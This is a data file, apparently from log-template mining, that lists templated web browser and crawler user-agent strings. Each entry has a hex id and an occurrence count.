+852c8c70,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; GTB6; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; .NET CLR <*>.<*>.<*>; Zango <*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; yie8),1
+c778e3d5,"Mozilla/<*>.<*> (compatible, MSIE <*>, Windows NT <*>.<*>; Trident/<*>.<*>; rv:<*>.<*>) like Gecko",1
+5c8fd351,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; GTB6.<*>; SLCC1; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; msn OptimizedIE8;ENUS),1
+4eaecea0,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> <*> <*> <*> <*> <*> <*>,3
+bc4b0ffd,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> <*> <*> <*> <*>,6
+fb2bd244,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; OfficeLiveConnector.<*>.<*>; OfficeLivePatch.<*>.<*>; .NET4.0C; .NE,1
+65d1cf8d,Mozilla/<*>.<*> (compatible; WebCapture <*>.<*>; Auto; Windows),6
+c5da0fed,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*> <*> <*> <*> <*> <*> <*> <*> <*> <*>,3
+9dbbfac6,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*> <*> .NET CLR <*>.<*>.<*>; .NET CLR <*> .NET CLR <*>,2
+7acb52f3,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; GTB6; InfoPath.<*>; .NET CLR <*>.<*>.<*>; Dealio Toolbar <*>.<*>; .NET CLR <*>; .NET CLR <*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>),1
+12c20033,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; OfficeLiveConnector.<*>.<*>; OfficeLivePatch.<*>.<*>; .NET4.0C; .NET4.0E; Alexa Toolbar),1
+e0e9b76f,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; SLCC1; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; OfficeLiveConnector.<*>.<*>; OfficeLivePatch.<*>.<*>; InfoPath.<*>; .NET4.0C; .NET4.0E; .NET CLR <*>.<*>.<*>),1
+333a1f46,"Chrome <*>.<*> <*>|Mozilla/<*>.<*> (Windows NT <*>.<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>",5
+0bceafda,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>; InfoPath.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; OfficeLiveConnector.<*>.<*>; OfficeLivePatch.<*>.,1
+ea057489,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> .NET CLR <*>.<*>.<*>; .NET CLR <*> .NET CLR <*>.<*>.<*>; .NET CLR <*> <*> <*> <*> <*> <*> <*> <*>,2
+49a38d81,Opera/<*>.<*> (Macintosh; Intel Mac OS X <*>.<*>.<*>; U; de) Presto/<*>.<*>.<*> Version/<*>.<*>,1
+ea5c9caf,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Win64; x64; Trident/<*>.<*>; GTB6; .NET CLR <*>.<*>.<*>; SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; .NET4.0C; AskTbIJBME<*>),2
+f4fda300,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*> <*> <*> <*> .NET CLR <*> .NET CLR <*> .NET CLR <*>.<*>.<*>),5
+e23dcab8,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; <*>,2
+c39161fa,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; WOW64; Trident/<*>.<*>; GTB6; SLCC1; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; Zune <*>.<*>; MSN Optimized;US),1
+6bf7bd18,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> .NET CLR <*> .NET CLR <*> .NET CLR <*>.<*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*>,3
+424a99a7,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; WOW64; Trident/<*>.<*>; SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; InfoPath.<*>; Zune <*>.<*>),1
+d2294df0,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> <*> <*> <*> .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; <*> <*> <*>,2
+991eb847,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; WOW64; Trident/<*>.<*>; Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; SV1) ; SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; InfoPath.<*>; Zune <*>.<*>; .NET CLR <*>.,1
+11597262,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; America Online Browser <*>.<*>; rev1.<*>; Windows NT <*>.<*>; SV1; .NET CLR <*>.<*>.<*>),3
+a1308f2b,"Mozilla/<*>.<*> (Windows; U; Windows NT <*>.<*>; ja-JP) AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Version/<*>.<*>.<*> Safari/<*>.<*>.<*>",2
+6a141d95,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> <*> <*> <*> .NET CLR <*>.<*>.<*>; .NET CLR <*> <*> <*> <*> <*>,2
+8bafbcc1,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; SV1) ; SLCC1; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; .NET CLR <*>.<*>.<*>),1
+2f1b263c,ExoRank,3
+9f9961d6,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>),1
+86e5b475,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; AskTbDVS2<*>),1
+4a621408,User-Agent:Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; .NET CLR <*>.<*>.<*>,1
+2b1c2cd5,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; chromeframe<*>; SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; .NET4.0C),1
+404adfa8,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; WOW64; Trident/<*>.<*>; SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; <*> <*> <*> <*>,2
+8948924f,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Win64; x64; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; SLCC1; Media Center PC <*>.<*>; .NET CLR <*>.<*>.<*>),1
+62ccf3a6,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> <*> <*> .NET CLR <*> .NET CLR <*> <*> <*> <*> <*>,4
+0c23b812,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; <*> <*>,2
+9d8bb8c8,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; <*> <*> <*> .NET CLR <*>; .NET CLR <*>.<*>.<*>; OfficeLiveConnector.<*>.<*>; OfficeLivePatch.<*>.<*>),2
+b190f2f8,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> <*> <*> <*> <*> <*> <*> .NET CLR <*> <*> <*> <*>; .NET CLR <*>,2
+c5822f95,Mozilla/<*>.<*> (Windows NT <*>.<*>; Win64; x64; rv:<*>.<*>) <*> <*> <*> <*>,2
+5c3256bf,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; <*>,2
+45294ed7,Opera/<*>.<*>(Windows NT <*>.<*>;U;en)Presto/<*>.<*>.<*> Version/<*>.<*>,1
+adf026c9,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> .NET CLR <*>.<*>.<*>; .NET CLR <*> .NET CLR <*>.<*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*> <*> <*> <*> <*>,3
+161156e6,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> <*>,7
+98c7ed99,Mozilla/<*>.<*> (Windows NT <*>.<*>; rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*> Opera <*>.<*>,1
+54cb8b00,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> .NET CLR <*>.<*>.<*>; .NET CLR <*> .NET CLR <*>.<*>.<*>; <*> <*> <*> <*> <*> <*>,2
+7787278f,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; WOW64; Trident/<*>.<*>; SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; msn OptimizedIE8;ZHCN),1
+b47c5b99,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; InfoPath.<*>; MS-RTC LM <*>; .NET4.0C; .NET4.0E),1
+42143d74,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; InfoPath.<*>; .NET CLR <*>; .NET CLR <*>; MS-RTC LM <*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; .NET4.0C; .NET4.0E),1
+d0b2cc29,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; GTB6.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; InfoPath.<*>; MS-RTC LM <*>; .NET CLR <*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>),1
+84ad954a,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*> <*> .NET CLR <*>.<*>.<*>; .NET CLR <*> <*>,2
+d713ee51,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; SLCC1; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; Tablet PC <*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>),1
+0e714e10,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; SV1) ; SLCC1; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; .NET CLR <*>.<*>.<*>; Tablet PC <*>.<*>; InfoPath.<*>),1
+cd3cd6fd,"Mozilla/<*>.<*> (Windows NT <*>.<*>; WOW64) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> Core<*> QQBrowser<*>",1
+3bc438d9,SEMrushBot,1
+d202d264,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; GTB6.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>; InfoPath.<*>; .NET CLR <*>; .NET CLR <*>; .NET CLR <*>.<*>.<*>; MS-RTC LM <*>; .NET4.0C; .NET4.0E),1
+ac04b038,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; WOW64; Trident/<*>.<*>; SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>; .NET CLR <*>.<*>.<*>; InfoPath.<*>; MS-RTC LM <*>),1
+44948794,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Win64; x64; Trident/<*>.<*>; .NET CLR <*>.<*>.<*>; SLCC1; Tablet PC <*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>),1
+1d2bf439,Mozilla/<*>.<*> (WordPress.com; https://en.support.wordpress.com/contact/),2
+82599a0d,"Mozilla/<*>.<*> (Linux; U; Android <*>.<*>.<*>; zh-CN; F5121 Build/<*>.<*>.A.<*>.<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> UCBrowser<*> Mobile Safari/<*>.<*>",1
+c60d5199,"Mozilla/<*>.<*> (Linux; U; Android <*>.<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Mobile Safari/<*>.<*>",21
+00d897dc,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; vivo X7 Build/LMY47V; wv) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> Mobile Safari/<*>.<*> baiduboxapp/<*>.<*>.<*> (Baidu; P1 <*>.<*>.<*>)",2
+637a21a2,TurnitinBot (https://turnitin.com/robot/crawlerinfo.html),13
+3fbe1a49,MobileSafari/<*>.<*> CFNetwork/<*>.<*>.<*> Darwin/<*>.<*>.<*>,4
